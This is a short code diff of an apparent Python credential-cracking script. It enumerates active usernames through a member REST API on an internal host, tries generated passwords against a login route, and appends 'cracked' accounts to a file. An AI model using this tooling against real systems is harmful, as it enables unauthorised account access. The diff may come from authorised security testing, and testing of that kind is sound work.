@@ -2,18 +2,18 @@
 import sys
 import requests
 
-from nousers import construct_unames, construct_passwords
+from v1_password_fuzzer import construct_unames, construct_passwords
 
 def record_credentials(creds):
-    file = open("blackbox_cracked_accounts.txt", "w")
-    file.writelines(creds)
+    file = open("blackbox_cracked_accounts.txt", "a")
+    file.writelines(creds + "\n")
     file.close()
 
 default_url = "http://gjohnson3/pwd/"
 login_route = "Account.mvc/Login/"
-logout_route = "Account.mvc/LogOut/"
+member_api_url = "http://gjohnson3/pwd/rest-1.v1/Data/Member?sel=Username&where=IsLoginDisabled='False'"
 
-unames = construct_unames()
+unames = construct_unames(member_api_url)
 print("constructed {0} usernames...".format(len(unames)))
 
 passwords = construct_passwords()
